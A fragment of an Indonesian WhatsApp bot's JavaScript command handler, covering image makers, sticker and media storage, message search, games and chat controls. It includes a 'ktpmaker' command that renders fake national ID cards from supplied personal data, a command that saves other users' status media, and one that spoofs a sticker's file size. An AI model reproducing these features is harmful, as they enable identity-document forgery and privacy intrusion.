case 'marble2':
case 'ice':
case 'juice':
case 'rusty':
case 'abstra':
case 'biscuit':
case 'wood':
case 'scifi':
case 'metalr':
case 'purpleg':
case 'shiny': 
case 'jewelry':
case 'jewelry2':
case 'jewelry3':
case 'jewelry4':
case 'jewelry5':
case 'jewelry6':
case 'jewelry7':
case 'jewelry8':
case 'metalh':
case 'golden':
case 'glitter':
case 'glitter2':
case 'glitter3':
case 'glitter4':
case 'glitter5':
case 'glitter6':
case 'glitter7':
case 'metale':
case 'carbon':
case 'candy':
case 'metalb':
case 'gemb':
case '3dchrome':
case 'metalb2':
case 'metalg':
if (args.length < 1) return reply(lang.noteks(prefix, command))
let textpro2 = await getBuffer(`${alphaapi}/textpro/${command}?apikey=${alphakey}&text=${q}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,textpro2, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
break  
case 'tahta':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   tahta = await getBuffer(`${ApiZeks}/api/hartatahta?text=${F}&apikey=${zeksApikey}`)
                   tahtah = `${lang.success()}\n\nNih kak`
                   sendImageMaker(tahta, tahtah, sender)
                  break
       case 'ytgold':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   ytgold = await getBuffer(`${ApiZeks}/api/gplaybutton?text=${F}&apikey=${zeksApikey}`)
                   ytgoldp = `${lang.success()}\n\nNih kak`
                   sendImageMaker(ytgold, ytgoldp, sender)
                   break  
       case 'ytsilver':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   ytsilver = await getBuffer(`${ApiZeks}/api/splaybutton?text=${F}&apikey=${zeksApikey}`)
                   ytsilverp = `${lang.success()}\n\nNih kak`
                   sendImageMaker(ytsilver, ytsilverp, sender)
                   break              
     case 'nulis':
									reply(`*Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
									break
						case 'nuliskiri':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'22',
									'-interline-spacing',
									'2',
									'-annotate',
									'+140+153',
									fixHeight,
									'./media/nulis/images/buku/setelahkiri.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'nuliskanan':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'2',
									'-annotate',
									'+128+129',
									fixHeight,
									'./media/nulis/images/buku/setelahkanan.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokiri':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'1720x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'4',
									'-annotate',
									'+48+185',
									fixHeight,
									'./media/nulis/images/folio/setelahkiri.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokanan':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'3',
									'-annotate',
									'+89+190',
									fixHeight,
									'./media/nulis/images/folio/setelahkanan.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
									})
									}
									break      
       case 'ttp':  
                    if (args.length < 1) return reply(lang.noteks(prefix, command))
                    ttp = args.join(' ')
                    anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${ttp}`)
                    alpha.sendMessage(from, anu1, image, {quoted: ftroli, caption : '.sticker'})
                    break
         case 'attp':  
                    if (args.length < 1) return reply(lang.noteks(prefix, command))
                    hhhh = q
                    anu1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${hhhh}`)
                    alpha.sendMessage(from, anu1, sticker, {quoted: mek})
                    break
             case 'ktpmaker': case 'ktp':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|LoL Human|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    reply('waitt')
                    bikin = (`https://ferdiz-afk.my.id//api/maker/ktp?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gdarah=-&almt=${jl}&rt-rw=${rtrw}&kel=${lurah}&kcmtn=${camat}&agma=${agama}&status=${nikah}&kerja=${kerja}&negara=${warga}&berlaku=${until}&prov=${prov}&kab=${kabu}&picurl=${img}`)
                      console.log(bikin)
                    imge = await getBuffer(bikin)
                    await alpha.sendMessage(from, imge, image, { thumbnail: Buffer.alloc(0), quoted: mek });
                    break;
        case 'nulis2':
if (args.length < 1) return reply(`*Usage*: ${prefix + command} nama&kelas&nomor&kata\n*Example*: ${prefix + command} udin&20&17&blablabla`)
var bodi = args.join(" ")
var nama = bodi.split("&")[0];
var kelas = bodi.split("&")[1];
var no = bodi.split("&")[2];
var aksarane = bodi.split("&")[3];
reply('membuat bos...')
                 rakz = await getBuffer(`https://ferdiz-afk.my.id//api/tulis?nama=${nama}&no=${no}&kelas=${kelas}&text=${aksarane}`)
                 alpha.sendMessage(from, rakz, image, { quoted: mek ,thumbnail: Buffer.alloc(0) });

                 break;
              /*
              ]----------------------------------------------------------------> STORAGE <----------------------------------------------------------------[
              */
	        case 'addstik':
	if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedSticker) return fakestatus('Reply stiker')
					nm = body.slice(9)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(boij)
					setiker.push(`${nm}`)
					fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./temp/stik.json', JSON.stringify(setiker))
					fakegroup(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
					break
	      case 'liststik':
	      case 'liststiker':
	      case 'liststc':
					teks = '*Sticker list :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
					
			case 'addimg':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedImage) return fakegroup('```Reply imagenya```')
					clara = body.slice(8)
					if (!clara) return fakegroup('```Nama imagenya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./media/foto/${svst}.jpg`, delb)
					fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`)
					break
			case 'listimg':
					teks = '*Image list :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama foto/image_`
					fakegroup(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
			case 'addvid':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedVideo) return fakegroup('```Reply vidionya```')
					svst = body.slice(8)
					if (!svst) return fakegroup('```Nama vidionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./media/video/${svst}.mp4`, delb)
					fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`)
					break
	        case 'listvid':
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}* \n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama video_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
			
			case 'addvn':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedAudio) return fakegroup('```Reply vnnya```')
					svst = body.slice(7)
					if (!svst) return reply('```Nama audionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./media/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
					fakegroup( `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
					break
           
			case 'listvn':
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama audio_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
			case 'addrespon':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if(!q) return reply(`ketik perintah ${prefix + command} filter|jawab!`)
					fltr = q.split('|')[0]
					jwb = q.split('|')[1]
					if(!jwb) return reply('Format salah!')
					for(let i of filter){
					  if(fltr.includes(i.Filter)) return reply(`Filter ${fltr} sudah ada didatabase`)
					}
					const chat = {
					Filter : fltr,
					Jawaban : jwb
					}
					filter.push(chat)
					fs.writeFileSync('./src/filter.json', JSON.stringify(filter))
					reply(`Sukses menambahkan filter ${fltr}\nCek dengan cara ${prefix}listchatrespon`)
					break
					
			case 'delrespon':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					for(let i=0; i<filter.length; i++){
					if(q.includes(filter[i].Filter)){
					   obj = {
					      txt: filter[i].text,
					      balesan: filter[i].balesan
					   }
					   let del = filter.indexOf(filter[i])
					   filter.splice(del, 1)
					   fs.writeFileSync('./src/filter.json', JSON.stringify(filter))
					   reply(`Sukses Menghapus Respon ${q}`)
					}
					}
					break
case 'listrespon':
   teks = 'List Respon:\n'
   for (let i of filter) {
   teks += `• Filter : ${i.Filter}\n• Jawab : ${i.Jawaban}\n---------------------------\n`
   }
   teks += `Total : ${filter.length}`
   alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek})
   break
		case 'caripesan2':
            if(!q)return reply('Masukkan pesan yg mau di cari')
            let v = await alpha.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await alpha.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
     case 'searchmsg':  
             if (args.length < 1) return reply(`Pesan Yang Mau Dicari Apaan?\nContoh : ${command} halo|10`)
             teks = arg
             if (teks.includes("|")) { 
             try {
             var ve = teks.split("|")[0]
             var za = teks.split("|")[1]
             sampai = `${za}`
             if (isNaN(sampai)) return reply('Harus berupa Angka!')
             batas = parseInt(sampai) + 1
             if (batas > 20) return reply('Maks 20!')
             reply(lang.wait())
             cok = await nino.searchMessages(`${ve}`, from, batas,1) 
             if (cok.messages.length < 2) return reply('Tidak Ditemukan Pesan') 
             if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
             for (i=1;i < cok.messages.length;i++) {
             if (cok.messages[i].message) {
             alpha.sendMessage(from, `Ditemukan!`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 
			}
			}
             } catch (e) {
             return reply(String(e))}
             } else {
             reply(`Format salah, format yang benar : ${command} halo|10`)}
             break
    case 'hash':
                try {
                if (!isQuotedSticker) return reply('Reply Sticker!')
                const encmeds = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                const mediastick = await alpha.downloadMediaMessage(encmeds)
                var crypto = require('crypto')
                hash = crypto.createHash('sha256').update(mediastick).digest('base64');
                console.log(hash)
                reply (hash)
                } catch {
                	reply(`reply stiker dengan command ${prefix}hash`)
	}
            break
    case 'delvote':
            if(!isGroupAdmins && !mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlygcAdmin())
            if(isVote) return reply(lang.noSesiVote())
            delVote(from)
            reply(lang.suksesDelVot())
            break
    case 'voting':
            if(!isGroupAdmins && !mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlygcAdmin())
            if(!isGroup) return reply(lang.onlygc())
            if (isVote) return reply(lang.adaVoting())
            if(!q) return reply(lang.caraVoting())
            if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || mek.message.extendedTextMessage.contextInfo == null) {
            let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply(lang.caraVot(prefix, command))
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
		case 'jadibot':
			//    if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.callOwner())
			//    jadibot(reply,alpha,from)
			var jadibdj = await getBuffer('https://telegra.ph/file/18be96b6415ea8833dbe5.jpg')
							sendButLocation(from, jadibut() , `Jangan klik doang 〽️ ${enter}${enter}${botname}™© | By ${ownername}`,jadibdj,  [{"buttonId": `payment`,"buttonText": {"displayText": "PAYMENT"},"type": "RESPONSE"}], {})
							break
			    break
		case 'stopjadibot':
			    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			    stopjadibot(reply)
			    break
		case 'listbot':
			    let tekss = '「 *LIST JADIBOT* 」\n'
			    for(let i of listjadibot) {
			    tekss += `*Number* : ${i.jid.split('@')[0]}
*Name* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
			    }
			    reply(tekss)
		case 'addcmd': 
       case 'setcmd':
              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
              if (isQuotedSticker) {
              if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              reply(lang.success())
              } else {
              reply('Reply stickenya')
}
              break
       case 'delcmd':
              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
              if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
              reply(lang.success())
              break
       case 'listcmd':
              let teksnyee = `「 *LIST STICKER CMD* 」`
              let cemde = [];
              for (let i of scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n📍 *ID :* ${i.id}\n📍 *Cmd* : ${i.chats}`
}
              mentions(teksnyee, cemde, true)
              break
      case 'delttt':
case 'delttc':
               if (!isGroup) return reply(lang.onlygc())
              // if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
               delete tictactoe[senderNumber]
fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply(lang.suksesDelTtt())
}
               break
        case 'cekhistory':
reply(` S T A T U S  T I C T A C T O E ${enter}•> Win : ${checkWin(sender)}${enter}•> Lose : ${checkLose(sender)}`)
break
case 'delsesi':
if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply('Hanya bisa didelete oleh admin group dan owner bot')
if (args[0] === 'ttt') {
delete tictactoe[senderNumber]
fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply(lang.noSesiTtt())
}
} else if (args[0] === 'vote') {
if(isVote) return reply(lang.noSesiVote())
            delVote(from)
            reply(lang.sukseDelVot())
} else {
	reply(`${prefix + command}delsesi ttt atau vote`)
}
break

case 'tictactoe':
case 'ttt':
if (!isGroup)return reply('*Khusus group*')
if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
if (fs.existsSync(`./temp/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan${enter}Ketik *${prefix}delsesi ttt*, untuk menghapus sesi`)
if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
tttSkuy = setTtt(`${from}`)
tttSkuy.status = false
tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
tttSkuy.Y = args[0].replace("@", "");
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
starGame = `「 *MEMULAI GAME TICTACTOE* 」${enter}${enter}•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe ${enter}[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan${enter}${enter}`
alpha.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
break
             case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await alpha.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:mek})
alpha.relayWAMessage(costick)
break
case "colongsw": 
        if (!mek.key.fromMe) return
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await alpha.downloadAndSaveMediaMessage(ger);
          alpha.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await alpha.downloadAndSaveMediaMessage(ger);
          alpha.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong")
        }
        break
       case "listonline": 
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [
            ...Object.keys(alpha.chats.get(id).presences),
            alpha.user.jid,
          ];
          alpha.reply(
            m.chat,
            "「 L I S T   O N L I N E  」\n" +
              online.map((v) => "├ @" + v.replace(/@.+/, "")).join`\n` +
              "\n",
            m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
        } catch (e) {
          m.reply("");
        }
        break;
        case 'getname':
 try {
getnem = alpha.getName(mek.quoted.sender)
reply(`${getnem}`)
} catch {
	reply ('Reply pesan @user')
	}
break
case 'linkgrup':
case 'linkgroup':
				case 'linkgc':
				    if (!isGroup) return reply(lang.onlygc())
				    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				    linkgc = await alpha.groupInviteCode (from)
				    yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
				    alpha.sendMessage(from, yeh, text, {quoted: mek})
			        break
		case 'unpin':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                alpha.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
        case 'pin':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                alpha.modifyChat(from, ChatModification.pin)
                reply('*succes pin this chat*')
                console.log('pinned chat = ' + from)
                break
         case 'unreadall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                var chats = await alpha.chats.all()
                chats.map( async ({ jid }) => {
                await alpha.chatRead(jid, 'unread')
                    })
		    reply(`\`\`\`Successfully unread ${chats.length} chats !\`\`\``)
		    console.log(chats.length)
	        break
	        
            case 'readall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                var chats = await alpha.chats.all()
                chats.map( async ({ jid }) => {
                await alpha.chatRead(jid)
                })
		reply(`\`\`\`Successfully read ${chats.length} chats !\`\`\``)
	      console.log(chats.length)
		break
		case 'unarchiveall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                reply('*succes unarchive all chat*')
                console.log('succes unarchive chat = ' + from)
                anu = await alpha.chats.all()
                for (let _ of anu) {
                alpha.modifyChat(_.jid, ChatModification.unarchive)
                }
                break
                
            case 'archive':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                reply(lang.wait())
                console.log('succes archive chat = ' + from)
                await sleep(3000)
                alpha.modifyChat(from, ChatModification.archive)
                break
           case 'delthischat':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                console.log('succes delete chat = ' + from)
                await sleep(4000)
                await alpha.modifyChat(from, ChatModification.delete)
                reply('*succes delete this chat*')
                break
            case 'ssweb':
            case 'ss':
                if (args.length < 1) return reply('Urlnya mana om')
					teks = q
					anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
					buff = await getBuffer(anu.screenshot)
					alpha.sendMessage(from, buff, image, {quoted: mek, caption : teks})
					break
			case 'artinama':
                if (args.length < 1) return reply('Apa yang mau dicari um?')
                teks = q
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/arti?nama=${teks}`, {method: 'get'})
					reply(`Arti Nama ${teks}\n\n`+anu.result)
				break
			case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
ter = command[1].toLowerCase()
  tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
 reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
 break
 case 'getexif':
try {
    if (!m.quoted) return reply('Tag stikernya!')
    cok = { message: { [m.quoted.mtype]: m.quoted } }
    if (/sticker/.test(m.quoted.mtype)) {
        let img = new webp.Image()
        await img.loadBuffer(await m.quoted.download())
        reply(util.format(JSON.parse(img.exif.slice(22).toString())))
    }
    } catch (e) {
    	throw e
    reply(String(e))
    }
    break
		case 'afk':
			if (!isGroup) return reply(lang.onlygc())
            if (isAfkOn) return 
                reason = q ? q : 'Nothing'
                off.addAfkUser(sender, Date.now(), reason, _off)
               papa =  `\n*@${sender.split('@')[0]}* is now AFK\n*Reason :* ${reason}\n`
                alpha.sendMessage(from,papa, text,{quoted : ftroli,contextInfo: {mentionedJid: [sender]}})
            break
        case 'autoread':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return reply(lang.anjawaUdhOn(command))
readGc = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return reply(lang.anjawaUdhOn(command))
readPc = true
reply(`Succes mengaktifkan autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Succes mematikan autoread pc`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
case 'nsfw':
					    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
						if (!isGroup) return reply(lang.onlygc()) 
						if (args.length < 1) return reply(lang.anjawaUdhOon(command))
						if (args[0] === 'on') {
						if (isNsfw) return reply(lang.anjawaUdhOn(command))
						_nsfw.push(from)
						fs.writeFileSync('./src/nsfw.json', JSON.stringify(_nsfw))
						reply(lang.anjawaOn(command))
						} else if (args[0] === 'off') {
						_nsfw.splice(from, 1)
						fs.writeFileSync('./src/nsfw.json', JSON.stringify(_nsfw))
						reply(lang.anjawaOff(command))
						} else if (!q) {
          sendButMessage(from, `MODE NSFW`, `Choose one`, [
            {
              buttonId: 'nsfw on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'nsfw off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'antibug':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          if (args[0] === 'on') {
          if (bugc === true) return reply(lang.anjawaUdhOn(command))
          bugc = true
          antitrol = true
          reply(lang.anjawaOn(command))
          } else if (args[0] === 'off') {
          if (bugc === false) return
